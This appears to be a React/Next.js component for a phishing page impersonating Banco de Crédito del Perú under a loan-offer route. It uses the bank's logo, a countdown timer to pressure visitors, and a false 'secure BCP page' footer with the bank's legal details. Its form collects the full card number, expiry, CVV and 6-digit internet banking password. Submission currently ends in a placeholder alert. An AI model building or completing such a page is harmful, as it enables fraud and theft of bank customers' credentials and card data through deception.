// app/prestamo/tarjeta/TarjetaClient.tsx
"use client";

import { useEffect, useState } from "react";

export default function TarjetaClient({
  amount,
  payDay,
  docType,
  docNumber,
}: {
  amount: string;
  payDay: string;
  docType: string;
  docNumber: string;
}) {
  const [seconds, setSeconds] = useState(300);
  useEffect(() => {
    const t = setInterval(() => setSeconds((s) => Math.max(0, s - 1)), 1000);
    return () => clearInterval(t);
  }, []);

  const [card, setCard] = useState("");
  const [exp, setExp] = useState("");
  const [cvv, setCvv] = useState("");
  const [remember, setRemember] = useState(false);
  const [clave, setClave] = useState("");

  const formatCard = (v: string) =>
    v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ").trim();

  const formatExp = (v: string) => {
    const d = v.replace(/\D/g, "").slice(0, 4);
    if (d.length <= 2) return d;
    return d.slice(0, 2) + "/" + d.slice(2);
  };

  const onSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const cardDigits = card.replace(/\s/g, "");
    if (cardDigits.length < 16) return;
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(exp)) return;
    if (!/^\d{3}$/.test(cvv)) return;
    if (!/^\d{6}$/.test(clave)) return;
    alert("Continuará…");
  };

  return (
    <div className="min-h-screen bg-white">
      <header className="bg-[color:var(--brand)] text-white">
        <div className="container-max h-12 flex items-center justify-between">
          <img src="/bcp-logo.svg" alt="BCP" className="h-5" />
          <div className="flex items-center gap-2 text-sm font-semibold">
            <span>{seconds} segundos</span>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden>
              <path d="M9 2h6M12 8v5l3 2" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
              <circle cx="12" cy="14" r="7" stroke="currentColor" strokeWidth="2"/>
            </svg>
          </div>
        </div>
      </header>

      <main className="container-max py-6">
        <div className="rounded-[16px] border border-[color:var(--line)] bg-white shadow-[0_12px_28px_rgba(0,0,0,.08)] p-5 max-w-[380px]">
          <h1 className="text-2xl font-bold text-[color:var(--brand)]">Ingresa tus datos</h1>

          <form onSubmit={onSubmit} className="mt-5 space-y-5">
            {/* Número de tarjeta */}
            <div className="field-bcp">
              <span className="field-bcp__label">Número de tarjeta</span>
              <input
                className="input-bcp w-full"
                inputMode="numeric"
                placeholder="0000 0000 0000 0000"
                value={card}
                onChange={(e) => setCard(formatCard(e.target.value))}
              />
            </div>

            {/* Recordar datos */}
            <label className="flex items-center gap-3 text-[15px] text-[#334155]">
              <input
                type="checkbox"
                checked={remember}
                onChange={(e) => setRemember(e.target.checked)}
                className="h-5 w-5 rounded border-[color:var(--line)]"
              />
              Recordar datos
            </label>

            {/* Fecha de vencimiento + CVV con el MISMO estilo “label chip” */}
            <div className="grid grid-cols-2 gap-3">
              <div className="field-bcp">
                <span className="field-bcp__label">Fecha de vencimiento</span>
                <input
                  className="input-bcp w-full"
                  inputMode="numeric"
                  placeholder="MM/AA"
                  value={exp}
                  onChange={(e) => setExp(formatExp(e.target.value))}
                />
              </div>
              <div className="field-bcp">
                <span className="field-bcp__label">CVV</span>
                <input
                  className="input-bcp w-full"
                  inputMode="numeric"
                  placeholder="CVV"
                  value={cvv}
                  onChange={(e) =>
                    setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
                  }
                />
              </div>
            </div>

            {/* Clave de internet (6 dígitos) */}
            <div className="field-bcp">
              <span className="field-bcp__label">Clave de internet de 6 dígitos</span>
              <input
                className="input-bcp w-full"
                inputMode="numeric"
                type="password"
                value={clave}
                onChange={(e) =>
                  setClave(e.target.value.replace(/\D/g, "").slice(0, 6))
                }
              />
            </div>

            <button type="submit" className="btn-bcp">Continuar</button>
          </form>
        </div>

        {/* Footer legal */}
        <div className="max-w-[380px] mx-auto text-center text-[12px] text-[#8AA0B6] mt-6 space-y-1">
          <div className="flex items-center justify-center gap-2">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden>
              <path d="M12 1l9 5v12l-9 5-9-5V6l9-5z" stroke="currentColor" strokeWidth="1.4"/>
              <path d="M8 12h8M12 8v8" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round"/>
            </svg>
            <span>
              Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate con nosotros al (01) 311-9898 o a través de nuestros medios digitales.
            </span>
          </div>
          <div className="pt-3 border-t border-[#E5EDF6]">
            Banco de Crédito del Perú S.A<br/>
            RUC: 20100047218<br/>
            © 2025 VIABCP.com<br/>
            Todos los derechos reservados
          </div>
        </div>
      </main>
    </div>
  );
}
